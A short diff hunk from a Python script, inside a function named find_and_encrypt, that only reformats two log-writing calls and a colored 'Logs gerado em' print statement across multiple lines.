@@ -162,9 +162,13 @@ def find_and_encrypt(
                                     if lf.write(
                                         logs[0]
                                     ):
-                                        lf.write(logs[1])
+                                        lf.write(
+                                            logs[1]
+                                       )
                                         
-                                        print(f'\33[32mLogs gerado em {lf}\33[0m')
+                                        print(
+                                            f'\33[32mLogs gerado em {lf}\33[0m'
+                                       )
 
 
 if __name__ == '__main__':
